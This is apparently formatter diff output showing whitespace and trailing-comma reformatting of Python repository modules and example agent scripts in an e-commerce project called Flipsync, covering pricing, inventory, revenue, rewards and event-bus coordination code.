         marketplace: Optional[MarketplaceType] = None,
-        limit: int = 10
+        limit: int = 10,
     ) -> List[PricingRecommendationModel]:
         """Get latest pricing recommendations."""
         try:
             conditions = []
-            
+
             if product_id:
                 conditions.append(PricingRecommendationModel.product_id == product_id)
-            
+
             if marketplace:
-                conditions.append(PricingRecommendationModel.marketplace == marketplace.value)
-            
+                conditions.append(
+                    PricingRecommendationModel.marketplace == marketplace.value
+                )
+
             # Only get non-expired recommendations
             now = datetime.now(timezone.utc)
             conditions.append(
                 or_(
                     PricingRecommendationModel.expires_at.is_(None),
-                    PricingRecommendationModel.expires_at > now
-                )
-            )
-            
+                    PricingRecommendationModel.expires_at > now,
+                )
+            )
+
             stmt = (
                 select(PricingRecommendationModel)
                 .where(and_(*conditions) if conditions else True)
                 .order_by(desc(PricingRecommendationModel.created_at))
                 .limit(limit)
             )
-            
+
             result = await session.execute(stmt)
             return result.scalars().all()
-            
+
         except Exception as e:
             logger.error(f"Error getting pricing recommendations: {e}")
             return []
-    
+
     async def store_competitor_data(
         self,
         session: AsyncSession,
         product_id: int,
         competitor_asin: str,
         competitor_price: Price,
-        competitor_data: Dict[str, Any]
+        competitor_data: Dict[str, Any],
     ) -> CompetitorModel:
         """Store competitor data."""
         try:
             competitor_record = {
                 "product_id": product_id,
@@ -287,78 +294,74 @@
                 "competitor_price": competitor_price.amount,
                 "currency": competitor_price.currency,
                 "marketplace": competitor_price.marketplace.value,
                 "competitor_data": competitor_data,
                 "recorded_at": competitor_price.timestamp,
-                "created_at": datetime.now(timezone.utc)
+                "created_at": datetime.now(timezone.utc),
             }
-            
+
             stmt = insert(CompetitorModel).values(**competitor_record)
             result = await session.execute(stmt)
             await session.commit()
-            
+
             # Get the created record
             comp_id = result.inserted_primary_key[0]
             stmt = select(CompetitorModel).where(CompetitorModel.id == comp_id)
             result = await session.execute(stmt)
             comp_record = result.scalar_one()
-            
+
             logger.info(f"Stored competitor data: {comp_record.id}")
             return comp_record
-            
+
         except Exception as e:
             await session.rollback()
             logger.error(f"Error storing competitor data: {e}")
             raise
-    
+
     async def get_competitor_data(
-        self,
-        session: AsyncSession,
-        product_id: int,
-        days: int = 7,
-        limit: int = 50
+        self, session: AsyncSession, product_id: int, days: int = 7, limit: int = 50
     ) -> List[CompetitorModel]:
         """Get competitor data for a product."""
         try:
             cutoff_date = datetime.now(timezone.utc) - timezone.timedelta(days=days)
-            
+
             stmt = (
                 select(CompetitorModel)
                 .where(
                     and_(
                         CompetitorModel.product_id == product_id,
-                        CompetitorModel.recorded_at >= cutoff_date
+                        CompetitorModel.recorded_at >= cutoff_date,
                     )
                 )
                 .order_by(desc(CompetitorModel.recorded_at))
                 .limit(limit)
             )
-            
+
             result = await session.execute(stmt)
             return result.scalars().all()
-            
+
         except Exception as e:
             logger.error(f"Error getting competitor data: {e}")
             return []
-    
+
     async def store_inventory_status(
-        self,
-        session: AsyncSession,
-        inventory: InventoryStatus
+        self, session: AsyncSession, inventory: InventoryStatus
     ) -> InventoryModel:
         """Store inventory status."""
         try:
             # Get or create product
-            product = await self.get_product_by_identifier(session, inventory.product_id)
+            product = await self.get_product_by_identifier(
+                session, inventory.product_id
+            )
             if not product:
                 product = await self.create_product(
                     session,
                     inventory.product_id,
                     f"Product {inventory.product_id.sku}",
-                    inventory.marketplace
-                )
-            
+                    inventory.marketplace,
+                )
+
             inventory_data = {
                 "product_id": product.id,
                 "marketplace": inventory.marketplace.value,
                 "quantity_available": inventory.quantity_available,
                 "quantity_reserved": inventory.quantity_reserved,
@@ -366,75 +369,73 @@
                 "reorder_point": inventory.reorder_point,
                 "max_stock_level": inventory.max_stock_level,
                 "warehouse_locations": inventory.warehouse_locations,
                 "fulfillment_method": inventory.fulfillment_method,
                 "last_updated": inventory.last_updated,
-                "created_at": datetime.now(timezone.utc)
+                "created_at": datetime.now(timezone.utc),
             }
-            
+
             stmt = insert(InventoryModel).values(**inventory_data)
             result = await session.execute(stmt)
             await session.commit()
-            
+
             # Get the created record
             inv_id = result.inserted_primary_key[0]
             stmt = select(InventoryModel).where(InventoryModel.id == inv_id)
             result = await session.execute(stmt)
             inv_record = result.scalar_one()
-            
+
             logger.info(f"Stored inventory status: {inv_record.id}")
             return inv_record
-            
+
         except Exception as e:
             await session.rollback()
             logger.error(f"Error storing inventory status: {e}")
             raise
-    
+
     async def get_latest_inventory_status(
         self,
         session: AsyncSession,
         product_id: int,
-        marketplace: Optional[MarketplaceType] = None
+        marketplace: Optional[MarketplaceType] = None,
     ) -> Optional[InventoryModel]:
         """Get latest inventory status for a product."""
         try:
             conditions = [InventoryModel.product_id == product_id]
-            
+
             if marketplace:
                 conditions.append(InventoryModel.marketplace == marketplace.value)
-            
+
             stmt = (
                 select(InventoryModel)
                 .where(and_(*conditions))
                 .order_by(desc(InventoryModel.last_updated))
                 .limit(1)
             )
-            
+
             result = await session.execute(stmt)
             return result.scalar_one_or_none()
-            
+
         except Exception as e:
             logger.error(f"Error getting inventory status: {e}")
             return None
-    
+
     async def store_market_decision(
-        self,
-        session: AsyncSession,
-        decision: MarketDecision
+        self, session: AsyncSession, decision: MarketDecision
     ) -> MarketDecisionModel:
         """Store market decision."""
         try:
             # Get or create product
             product = await self.get_product_by_identifier(session, decision.product_id)
             if not product:
                 product = await self.create_product(
                     session,
                     decision.product_id,
                     f"Product {decision.product_id.asin or decision.product_id.sku}",
-                    MarketplaceType.AMAZON  # Default marketplace
-                )
-            
+                    MarketplaceType.AMAZON,  # Default marketplace
+                )
+
             decision_data = {
                 "decision_id": decision.decision_id,
                 "decision_type": decision.decision_type,
                 "product_id": product.id,
                 "current_state": decision.current_state,
@@ -446,60 +447,62 @@
                 "requires_approval": decision.requires_approval,
                 "auto_execute": decision.auto_execute,
                 "approved_by": decision.approved_by,
                 "created_at": decision.created_at,
                 "approved_at": decision.approved_at,
-                "executed_at": decision.executed_at
+                "executed_at": decision.executed_at,
             }
-            
+
             stmt = insert(MarketDecisionModel).values(**decision_data)
             result = await session.execute(stmt)
             await session.commit()
-            
+
             # Get the created record
             dec_id = result.inserted_primary_key[0]
             stmt = select(MarketDecisionModel).where(MarketDecisionModel.id == dec_id)
             result = await session.execute(stmt)
             dec_record = result.scalar_one()
-            
+
             logger.info(f"Stored market decision: {dec_record.id}")
             return dec_record
-            
+
         except Exception as e:
             await session.rollback()
             logger.error(f"Error storing market decision: {e}")
             raise
-    
+
     async def get_market_decisions(
         self,
         session: AsyncSession,
         product_id: Optional[int] = None,
         decision_type: Optional[str] = None,
         requires_approval: Optional[bool] = None,
-        limit: int = 20
+        limit: int = 20,
     ) -> List[MarketDecisionModel]:
         """Get market decisions with filters."""
         try:
             conditions = []
-            
+
             if product_id:
                 conditions.append(MarketDecisionModel.product_id == product_id)
-            
+
             if decision_type:
                 conditions.append(MarketDecisionModel.decision_type == decision_type)
-            
+
             if requires_approval is not None:
-                conditions.append(MarketDecisionModel.requires_approval == requires_approval)
-            
+                conditions.append(
+                    MarketDecisionModel.requires_approval == requires_approval
+                )
+
             stmt = (
                 select(MarketDecisionModel)
                 .where(and_(*conditions) if conditions else True)
                 .order_by(desc(MarketDecisionModel.created_at))
                 .limit(limit)
             )
-            
+
             result = await session.execute(stmt)
             return result.scalars().all()
-            
+
         except Exception as e:
             logger.error(f"Error getting market decisions: {e}")
             return []
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/market_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/examples/event_system_example.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/examples/event_system_example.py	2025-06-19 04:04:01.461910+00:00
@@ -10,82 +10,83 @@
 import uuid
 from datetime import datetime
 
 from fs_agt_clean.core.coordination.event_system import (
     # Core components
-    EventType, EventPriority,
-    
+    EventType,
+    EventPriority,
     # Event bus
-    InMemoryEventBus, set_event_bus,
-    
+    InMemoryEventBus,
+    set_event_bus,
     # Publisher and subscriber
-    create_publisher, create_subscriber,
-    
+    create_publisher,
+    create_subscriber,
     # Subscription filters
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 )
 logger = logging.getLogger("event_system_example")
 
 
 class MarketAgent:
     """
     Agent that provides market data.
     """
-    
+
     def __init__(self):
         """Initialize the market agent."""
         self.agent_id = "market_agent"
         self.publisher = create_publisher(source_id=self.agent_id)
         self.subscriber = create_subscriber(subscriber_id=self.agent_id)
-        
+
         # Market data
         self.market_data = {
             "crypto": {
                 "bitcoin": {"price": 50000, "volume": 1000000},
                 "ethereum": {"price": 3000, "volume": 500000},
-                "dogecoin": {"price": 0.5, "volume": 2000000}
+                "dogecoin": {"price": 0.5, "volume": 2000000},
             },
             "stocks": {
                 "aapl": {"price": 150, "volume": 5000000},
                 "msft": {"price": 300, "volume": 3000000},
-                "googl": {"price": 2500, "volume": 1000000}
-            }
+                "googl": {"price": 2500, "volume": 1000000},
+            },
         }
-    
+
     async def start(self):
         """Start the market agent."""
         logger.info(f"Starting {self.agent_id}")
-        
+
         # Subscribe to market data queries
         await self.subscriber.subscribe(
             filter=CompositeFilter(
                 filters=[
                     EventTypeFilter(event_types={EventType.QUERY}),
-                    EventNameFilter(event_names={"get_market_data"})
+                    EventNameFilter(event_names={"get_market_data"}),
                 ],
-                require_all=True
+                require_all=True,
             ),
-            handler=self.handle_market_data_query
-        )
-        
+            handler=self.handle_market_data_query,
+        )
+
         logger.info(f"{self.agent_id} started")
-    
+
     async def handle_market_data_query(self, event):
         """Handle a market data query."""
         logger.info(f"{self.agent_id} received query: {event.query_name}")
-        
+
         # Extract parameters
         market = event.parameters.get("market")
         symbol = event.parameters.get("symbol")
-        
+
         # Get market data
         if market in self.market_data:
             if symbol:
                 if symbol in self.market_data[market]:
                     data = self.market_data[market][symbol]
@@ -101,68 +102,68 @@
                 error_message = None
         else:
             data = None
             success = False
             error_message = f"Market {market} not found"
-        
+
         # Send response
         await self.publisher.publish_response(
             query_id=event.event_id,
             response_data=data,
             is_success=success,
             error_message=error_message,
-            correlation_id=event.correlation_id
-        )
-        
+            correlation_id=event.correlation_id,
+        )
+
         logger.info(f"{self.agent_id} sent response to query {event.event_id}")
 
 
 class ExecutiveAgent:
     """
     Agent that makes executive decisions based on market data.
     """
-    
+
     def __init__(self):
         """Initialize the executive agent."""
         self.agent_id = "executive_agent"
         self.publisher = create_publisher(source_id=self.agent_id)
         self.subscriber = create_subscriber(subscriber_id=self.agent_id)
-        
+
         # Track pending queries
         self.pending_queries = {}
-    
+
     async def start(self):
         """Start the executive agent."""
         logger.info(f"Starting {self.agent_id}")
-        
+
         # Subscribe to responses
         await self.subscriber.subscribe(
             filter=EventTypeFilter(event_types={EventType.RESPONSE}),
-            handler=self.handle_response
-        )
-        
+            handler=self.handle_response,
+        )
+
         logger.info(f"{self.agent_id} started")
-    
+
     async def get_market_data(self, market, symbol=None):
         """Get market data from the market agent."""
         logger.info(f"{self.agent_id} requesting market data for {market}/{symbol}")
-        
+
         # Generate a correlation ID for this request
         correlation_id = str(uuid.uuid4())
-        
+
         # Create a future to wait for the response
         future = asyncio.Future()
         self.pending_queries[correlation_id] = future
-        
+
         # Send the query
         await self.publisher.publish_query(
             query_name="get_market_data",
             parameters={"market": market, "symbol": symbol},
             target="market_agent",
-            correlation_id=correlation_id
-        )
-        
+            correlation_id=correlation_id,
+        )
+
         # Wait for the response
         try:
             response = await asyncio.wait_for(future, timeout=5.0)
             return response
         except asyncio.TimeoutError:
@@ -170,40 +171,42 @@
             return None
         finally:
             # Clean up
             if correlation_id in self.pending_queries:
                 del self.pending_queries[correlation_id]
-    
+
     async def handle_response(self, event):
         """Handle a response event."""
         # Check if this is a response to one of our queries
         correlation_id = event.correlation_id
         if correlation_id in self.pending_queries:
-            logger.info(f"{self.agent_id} received response for correlation ID {correlation_id}")
-            
+            logger.info(
+                f"{self.agent_id} received response for correlation ID {correlation_id}"
+            )
+
             # Get the future
             future = self.pending_queries[correlation_id]
-            
+
             # Set the result
             if not future.done():
                 if event.is_success:
                     future.set_result(event.response_data)
                 else:
                     future.set_exception(Exception(event.error_message))
-    
+
     async def make_investment_decision(self, market, symbol):
         """Make an investment decision based on market data."""
         logger.info(f"{self.agent_id} making investment decision for {market}/{symbol}")
-        
+
         # Get market data
         data = await self.get_market_data(market, symbol)
-        
+
         if data:
             # Simple decision logic
             price = data["price"]
             volume = data["volume"]
-            
+
             if volume > 1000000:
                 if price < 100:
                     decision = "buy"
                     confidence = 0.8
                 elif price < 1000:
@@ -213,27 +216,29 @@
                     decision = "sell"
                     confidence = 0.7
             else:
                 decision = "hold"
                 confidence = 0.5
-            
-            logger.info(f"{self.agent_id} decided to {decision} {market}/{symbol} with confidence {confidence}")
-            
+
+            logger.info(
+                f"{self.agent_id} decided to {decision} {market}/{symbol} with confidence {confidence}"
+            )
+
             # Publish the decision
             await self.publisher.publish_notification(
                 notification_name="investment_decision",
                 data={
                     "market": market,
                     "symbol": symbol,
                     "decision": decision,
                     "confidence": confidence,
                     "price": price,
                     "volume": volume,
-                    "timestamp": datetime.now().isoformat()
-                }
+                    "timestamp": datetime.now().isoformat(),
+                },
             )
-            
+
             return decision, confidence
         else:
             logger.error(f"{self.agent_id} could not make decision due to missing data")
             return None, 0.0
 
@@ -241,27 +246,27 @@
 async def main():
     """Main function."""
     # Create and set the event bus
     event_bus = InMemoryEventBus(bus_id="example_bus")
     set_event_bus(event_bus)
-    
+
     # Create agents
     market_agent = MarketAgent()
     executive_agent = ExecutiveAgent()
-    
+
     # Start agents
     await market_agent.start()
     await executive_agent.start()
-    
+
     # Make some investment decisions
     await executive_agent.make_investment_decision("crypto", "bitcoin")
     await executive_agent.make_investment_decision("stocks", "aapl")
     await executive_agent.make_investment_decision("crypto", "dogecoin")
-    
+
     # Try a non-existent market/symbol
     await executive_agent.make_investment_decision("forex", "usd_eur")
-    
+
     # Get event bus metrics
     metrics = await event_bus.get_metrics()
     logger.info(f"Event bus metrics: {metrics}")
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/examples/event_system_example.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/revenue_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/revenue_repository.py	2025-06-19 04:04:01.477207+00:00
@@ -16,11 +16,11 @@
 
 from fs_agt_clean.database.models.revenue import (
     ShippingArbitrageCalculation,
     RevenueTracking,
     UserRewardsBalance,
-    RevenueOptimizationLog
+    RevenueOptimizationLog,
 )
 from fs_agt_clean.database.repositories.base_repository import BaseRepository
 
 logger = logging.getLogger(__name__)
 
@@ -32,283 +32,305 @@
         """Initialize revenue repository."""
         super().__init__(session)
         self.session = session
 
     # Shipping Arbitrage Operations
-    async def create_shipping_calculation(self, calculation_data: Dict[str, Any]) -> ShippingArbitrageCalculation:
+    async def create_shipping_calculation(
+        self, calculation_data: Dict[str, Any]
+    ) -> ShippingArbitrageCalculation:
         """Create a new shipping arbitrage calculation record."""
         try:
             calculation = ShippingArbitrageCalculation(**calculation_data)
             self.session.add(calculation)
             await self.session.commit()
             await self.session.refresh(calculation)
-            
+
             logger.info(f"Created shipping calculation: {calculation.calculation_id}")
             return calculation
-            
+
         except Exception as e:
             await self.session.rollback()
             logger.error(f"Error creating shipping calculation: {e}")
             raise
 
     async def get_shipping_calculations_by_user(
-        self, 
-        user_id: str, 
-        limit: int = 50, 
-        offset: int = 0
+        self, user_id: str, limit: int = 50, offset: int = 0
     ) -> List[ShippingArbitrageCalculation]:
         """Get shipping calculations for a user."""
         try:
             query = (
                 select(ShippingArbitrageCalculation)
                 .where(ShippingArbitrageCalculation.user_id == user_id)
                 .order_by(desc(ShippingArbitrageCalculation.created_at))
                 .limit(limit)
                 .offset(offset)
             )
-            
+
             result = await self.session.execute(query)
             calculations = result.scalars().all()
-            
-            logger.info(f"Retrieved {len(calculations)} shipping calculations for user {user_id}")
+
+            logger.info(
+                f"Retrieved {len(calculations)} shipping calculations for user {user_id}"
+            )
             return list(calculations)
-            
+
         except Exception as e:
             logger.error(f"Error retrieving shipping calculations: {e}")
             raise
 
     async def get_total_savings_by_user(self, user_id: str) -> Decimal:
         """Get total shipping savings for a user."""
         try:
-            query = (
-                select(func.sum(ShippingArbitrageCalculation.savings_amount))
-                .where(ShippingArbitrageCalculation.user_id == user_id)
-            )
-            
+            query = select(func.sum(ShippingArbitrageCalculation.savings_amount)).where(
+                ShippingArbitrageCalculation.user_id == user_id
+            )
+
             result = await self.session.execute(query)
             total_savings = result.scalar() or Decimal("0.00")
-            
+
             logger.info(f"Total savings for user {user_id}: {total_savings}")
             return total_savings
-            
+
         except Exception as e:
             logger.error(f"Error calculating total savings: {e}")
             raise
 
     # Revenue Tracking Operations
-    async def create_revenue_record(self, revenue_data: Dict[str, Any]) -> RevenueTracking:
+    async def create_revenue_record(
+        self, revenue_data: Dict[str, Any]
+    ) -> RevenueTracking:
         """Create a new revenue tracking record."""
         try:
             revenue = RevenueTracking(**revenue_data)
             self.session.add(revenue)
             await self.session.commit()
             await self.session.refresh(revenue)
-            
+
             logger.info(f"Created revenue record: {revenue.revenue_id}")
             return revenue
-            
+
         except Exception as e:
             await self.session.rollback()
             logger.error(f"Error creating revenue record: {e}")
             raise
 
     async def get_revenue_by_user(
-        self, 
-        user_id: str, 
+        self,
+        user_id: str,
         revenue_type: Optional[str] = None,
-        limit: int = 50, 
-        offset: int = 0
+        limit: int = 50,
+        offset: int = 0,
     ) -> List[RevenueTracking]:
         """Get revenue records for a user."""
         try:
-            query = (
-                select(RevenueTracking)
-                .where(RevenueTracking.user_id == user_id)
-            )
-            
+            query = select(RevenueTracking).where(RevenueTracking.user_id == user_id)
+
             if revenue_type:
                 query = query.where(RevenueTracking.revenue_type == revenue_type)
-            
+
             query = (
-                query
-                .order_by(desc(RevenueTracking.created_at))
+                query.order_by(desc(RevenueTracking.created_at))
                 .limit(limit)
                 .offset(offset)
             )
-            
+
             result = await self.session.execute(query)
             revenue_records = result.scalars().all()
-            
-            logger.info(f"Retrieved {len(revenue_records)} revenue records for user {user_id}")
+
+            logger.info(
+                f"Retrieved {len(revenue_records)} revenue records for user {user_id}"
+            )
             return list(revenue_records)
-            
+
         except Exception as e:
             logger.error(f"Error retrieving revenue records: {e}")
             raise
 
-    async def get_total_revenue_by_user(self, user_id: str, revenue_type: Optional[str] = None) -> Decimal:
+    async def get_total_revenue_by_user(
+        self, user_id: str, revenue_type: Optional[str] = None
+    ) -> Decimal:
         """Get total revenue for a user."""
         try:
-            query = (
-                select(func.sum(RevenueTracking.amount))
-                .where(RevenueTracking.user_id == user_id)
-            )
-            
+            query = select(func.sum(RevenueTracking.amount)).where(
+                RevenueTracking.user_id == user_id
+            )
+
             if revenue_type:
                 query = query.where(RevenueTracking.revenue_type == revenue_type)
-            
+
             result = await self.session.execute(query)
             total_revenue = result.scalar() or Decimal("0.00")
-            
+
             logger.info(f"Total revenue for user {user_id}: {total_revenue}")
             return total_revenue
-            
+
         except Exception as e:
             logger.error(f"Error calculating total revenue: {e}")
             raise
 
     # User Rewards Operations
-    async def get_user_rewards_balance(self, user_id: str) -> Optional[UserRewardsBalance]:
+    async def get_user_rewards_balance(
+        self, user_id: str
+    ) -> Optional[UserRewardsBalance]:
         """Get user rewards balance."""
         try:
-            query = select(UserRewardsBalance).where(UserRewardsBalance.user_id == user_id)
+            query = select(UserRewardsBalance).where(
+                UserRewardsBalance.user_id == user_id
+            )
             result = await self.session.execute(query)
             balance = result.scalar_one_or_none()
-            
+
             if balance:
-                logger.info(f"Retrieved rewards balance for user {user_id}: {balance.current_balance}")
+                logger.info(
+                    f"Retrieved rewards balance for user {user_id}: {balance.current_balance}"
+                )
             else:
                 logger.info(f"No rewards balance found for user {user_id}")
-            
+
             return balance
-            
+
         except Exception as e:
             logger.error(f"Error retrieving user rewards balance: {e}")
             raise
 
-    async def create_or_update_rewards_balance(self, user_id: str, balance_data: Dict[str, Any]) -> UserRewardsBalance:
+    async def create_or_update_rewards_balance(
+        self, user_id: str, balance_data: Dict[str, Any]
+    ) -> UserRewardsBalance:
         """Create or update user rewards balance."""
         try:
             # Check if balance exists
             existing_balance = await self.get_user_rewards_balance(user_id)
-            
+
             if existing_balance:
                 # Update existing balance
                 for key, value in balance_data.items():
                     if hasattr(existing_balance, key):
                         setattr(existing_balance, key, value)
-                
+
                 existing_balance.updated_at = datetime.now(timezone.utc)
                 await self.session.commit()
                 await self.session.refresh(existing_balance)
-                
+
                 logger.info(f"Updated rewards balance for user {user_id}")
                 return existing_balance
             else:
                 # Create new balance
                 balance_data["user_id"] = user_id
                 new_balance = UserRewardsBalance(**balance_data)
                 self.session.add(new_balance)
                 await self.session.commit()
                 await self.session.refresh(new_balance)
-                
+
                 logger.info(f"Created rewards balance for user {user_id}")
                 return new_balance
-                
+
         except Exception as e:
             await self.session.rollback()
             logger.error(f"Error creating/updating rewards balance: {e}")
             raise
 
-    async def add_rewards_earning(self, user_id: str, amount: Decimal, source: str) -> UserRewardsBalance:
+    async def add_rewards_earning(
+        self, user_id: str, amount: Decimal, source: str
+    ) -> UserRewardsBalance:
         """Add rewards earning to user balance."""
         try:
             balance = await self.get_user_rewards_balance(user_id)
-            
+
             if not balance:
                 # Create new balance if doesn't exist
-                balance = await self.create_or_update_rewards_balance(user_id, {
-                    "current_balance": amount,
-                    "lifetime_earned": amount,
-                    "earning_history": [{"amount": float(amount), "source": source, "date": datetime.now(timezone.utc).isoformat()}]
-                })
+                balance = await self.create_or_update_rewards_balance(
+                    user_id,
+                    {
+                        "current_balance": amount,
+                        "lifetime_earned": amount,
+                        "earning_history": [
+                            {
+                                "amount": float(amount),
+                                "source": source,
+                                "date": datetime.now(timezone.utc).isoformat(),
+                            }
+                        ],
+                    },
+                )
             else:
                 # Update existing balance
                 balance.current_balance += amount
                 balance.lifetime_earned += amount
                 balance.last_earning_date = datetime.now(timezone.utc)
-                
+
                 # Update earning history
                 earning_record = {
                     "amount": float(amount),
                     "source": source,
-                    "date": datetime.now(timezone.utc).isoformat()
+                    "date": datetime.now(timezone.utc).isoformat(),
                 }
-                
+
                 if balance.earning_history:
                     balance.earning_history.append(earning_record)
                 else:
                     balance.earning_history = [earning_record]
-                
+
                 await self.session.commit()
                 await self.session.refresh(balance)
-            
+
             logger.info(f"Added {amount} rewards to user {user_id} from {source}")
             return balance
-            
+
         except Exception as e:
             await self.session.rollback()
             logger.error(f"Error adding rewards earning: {e}")
             raise
 
     # Revenue Optimization Logs
-    async def create_optimization_log(self, log_data: Dict[str, Any]) -> RevenueOptimizationLog:
+    async def create_optimization_log(
+        self, log_data: Dict[str, Any]
+    ) -> RevenueOptimizationLog:
         """Create a revenue optimization log entry."""
         try:
             log_entry = RevenueOptimizationLog(**log_data)
             self.session.add(log_entry)
             await self.session.commit()
             await self.session.refresh(log_entry)
-            
+
             logger.info(f"Created optimization log: {log_entry.log_id}")
             return log_entry
-            
+
         except Exception as e:
             await self.session.rollback()
             logger.error(f"Error creating optimization log: {e}")
             raise
 
     async def get_optimization_logs_by_user(
-        self, 
-        user_id: str, 
+        self,
+        user_id: str,
         optimization_type: Optional[str] = None,
-        limit: int = 50, 
-        offset: int = 0
+        limit: int = 50,
+        offset: int = 0,
     ) -> List[RevenueOptimizationLog]:
         """Get optimization logs for a user."""
         try:
+            query = select(RevenueOptimizationLog).where(
+                RevenueOptimizationLog.user_id == user_id
+            )
+
+            if optimization_type:
+                query = query.where(
+                    RevenueOptimizationLog.optimization_type == optimization_type
+                )
+
             query = (
-                select(RevenueOptimizationLog)
-                .where(RevenueOptimizationLog.user_id == user_id)
-            )
-            
-            if optimization_type:
-                query = query.where(RevenueOptimizationLog.optimization_type == optimization_type)
-            
-            query = (
-                query
-                .order_by(desc(RevenueOptimizationLog.created_at))
+                query.order_by(desc(RevenueOptimizationLog.created_at))
                 .limit(limit)
                 .offset(offset)
             )
-            
+
             result = await self.session.execute(query)
             logs = result.scalars().all()
-            
+
             logger.info(f"Retrieved {len(logs)} optimization logs for user {user_id}")
             return list(logs)
-            
+
         except Exception as e:
             logger.error(f"Error retrieving optimization logs: {e}")
             raise
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/revenue_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/examples/coordinator_example.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/examples/coordinator_example.py	2025-06-19 04:04:01.650344+00:00
@@ -10,126 +10,138 @@
 import uuid
 from datetime import datetime, timedelta
 
 from fs_agt_clean.core.coordination import (
     # Event System
-    Event, EventType, EventPriority, InMemoryEventBus, set_event_bus,
-    create_publisher, create_subscriber,
-    
+    Event,
+    EventType,
+    EventPriority,
+    InMemoryEventBus,
+    set_event_bus,
+    create_publisher,
+    create_subscriber,
     # Coordinator
-    AgentInfo, AgentStatus, AgentType, AgentCapability,
-    Task, TaskStatus, TaskPriority,
-    InMemoryCoordinator
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    Task,
+    TaskStatus,
+    TaskPriority,
+    InMemoryCoordinator,
 )
 
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 )
 logger = logging.getLogger("coordinator_example")
 
 
 class MarketAgent:
     """
     Agent that provides market data.
     """
-    
+
     def __init__(self):
         """Initialize the market agent."""
         self.agent_id = "market_agent"
         self.name = "Market Agent"
         self.description = "Provides market data and analysis"
         self.agent_type = AgentType.SPECIALIST
-        
+
         # Create publisher and subscriber
         self.publisher = create_publisher(source_id=self.agent_id)
         self.subscriber = create_subscriber(subscriber_id=self.agent_id)
-        
+
         # Define capabilities
         self.capabilities = [
             AgentCapability(
                 name="market_data",
                 description="Provides market data for various assets",
                 parameters={"market": "string", "symbol": "string"},
-                tags={"market", "data", "finance"}
+                tags={"market", "data", "finance"},
             ),
             AgentCapability(
                 name="market_analysis",
                 description="Analyzes market trends and patterns",
-                parameters={"market": "string", "symbol": "string", "timeframe": "string"},
-                tags={"market", "analysis", "finance"}
-            )
+                parameters={
+                    "market": "string",
+                    "symbol": "string",
+                    "timeframe": "string",
+                },
+                tags={"market", "analysis", "finance"},
+            ),
         ]
-        
+
         # Market data
         self.market_data = {
             "crypto": {
                 "bitcoin": {"price": 50000, "volume": 1000000},
                 "ethereum": {"price": 3000, "volume": 500000},
-                "dogecoin": {"price": 0.5, "volume": 2000000}
+                "dogecoin": {"price": 0.5, "volume": 2000000},
             },
             "stocks": {
                 "aapl": {"price": 150, "volume": 5000000},
                 "msft": {"price": 300, "volume": 3000000},
-                "googl": {"price": 2500, "volume": 1000000}
-            }
+                "googl": {"price": 2500, "volume": 1000000},
+            },
         }
-    
+
     async def start(self, coordinator):
         """
         Start the market agent.
-        
+
         Args:
             coordinator: The coordinator to register with
         """
         logger.info(f"Starting {self.name}")
-        
+
         # Register with the coordinator
         agent_info = AgentInfo(
             agent_id=self.agent_id,
             agent_type=self.agent_type,
             name=self.name,
             description=self.description,
-            capabilities=self.capabilities
-        )
-        
+            capabilities=self.capabilities,
+        )
+
         await coordinator.register_agent(agent_info)
-        
+
         # Subscribe to task events
         await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"execute_task"}),
-            handler=self.handle_task
-        )
-        
+            handler=self.handle_task,
+        )
+
         logger.info(f"{self.name} started")
-    
+
     async def handle_task(self, event):
         """
         Handle a task event.
-        
+
         Args:
             event: The task event
         """
         # Extract task information
         task_id = event.data.get("task_id")
         task_type = event.data.get("task_type")
         parameters = event.data.get("parameters", {})
-        
+
         logger.info(f"{self.name} received task: {task_id} ({task_type})")
-        
+
         # Process the task
         if task_type == "get_market_data":
             # Extract parameters
             market = parameters.get("market")
             symbol = parameters.get("symbol")
-            
+
             # Get market data
             result = None
             error = None
-            
+
             try:
                 if market in self.market_data:
                     if symbol:
                         if symbol in self.market_data[market]:
                             result = self.market_data[market][symbol]
@@ -139,48 +151,42 @@
                         result = self.market_data[market]
                 else:
                     error = f"Market {market} not found"
             except Exception as e:
                 error = str(e)
-            
+
             # Publish task result
             if error:
                 await self.publisher.publish_notification(
                     notification_name="task_failed",
-                    data={
-                        "task_id": task_id,
-                        "error": error
-                    }
+                    data={"task_id": task_id, "error": error},
                 )
             else:
                 await self.publisher.publish_notification(
                     notification_name="task_completed",
-                    data={
-                        "task_id": task_id,
-                        "result": result
-                    }
+                    data={"task_id": task_id, "result": result},
                 )
-        
+
         elif task_type == "analyze_market":
             # Extract parameters
             market = parameters.get("market")
             symbol = parameters.get("symbol")
-            
+
             # Perform market analysis
             result = None
             error = None
-            
+
             try:
                 if market in self.market_data:
                     if symbol:
                         if symbol in self.market_data[market]:
                             data = self.market_data[market][symbol]
-                            
+
                             # Simple analysis
                             price = data["price"]
                             volume = data["volume"]
-                            
+
                             if volume > 1000000:
                                 if price < 100:
                                     recommendation = "buy"
                                     confidence = 0.8
                                 elif price < 1000:
@@ -190,245 +196,245 @@
                                     recommendation = "sell"
                                     confidence = 0.7
                             else:
                                 recommendation = "hold"
                                 confidence = 0.5
-                            
+
                             result = {
                                 "recommendation": recommendation,
                                 "confidence": confidence,
                                 "price": price,
                                 "volume": volume,
-                                "analysis": f"Based on price and volume analysis, the recommendation is to {recommendation} with {confidence:.1f} confidence."
